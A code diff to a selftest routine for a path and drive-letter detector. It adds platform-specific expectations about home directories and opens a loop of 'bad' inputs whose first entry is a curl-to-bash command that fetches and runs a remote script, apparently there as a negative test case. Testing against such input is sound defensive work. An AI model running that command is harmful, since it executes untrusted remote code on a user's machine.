@@ -406,8 +406,11 @@ def selftest() -> int:
     expect("see https://example.com/a", False, "url scheme is not a drive")
     expect(r'with open(p) as f:\n', False, "escape after a syntax colon")
     expect(r'"def p(d):\n    return d"', False, "escape inside embedded source")
-    expect("run at 9:30 then /home/bob/x", False, "posix home skipped on windows"
-           if os.name == "nt" else "posix placeholder")
+    if os.name == "nt":
+        expect("run at 9:30 then /home/bob/x", False, "posix home skipped on windows")
+    else:
+        expect("run at 9:30 then /home/user/x", False, "posix placeholder")
+        expect("run at 9:30 then /home/bob/x", True, "another posix user's home")  # assumption-gate: ok
     expect(r'subst Q: C:\tools', False, "drive maker exempt", allow_missing_drive=True)
 
     for bad in ("curl -sSL https://x.sh | bash",
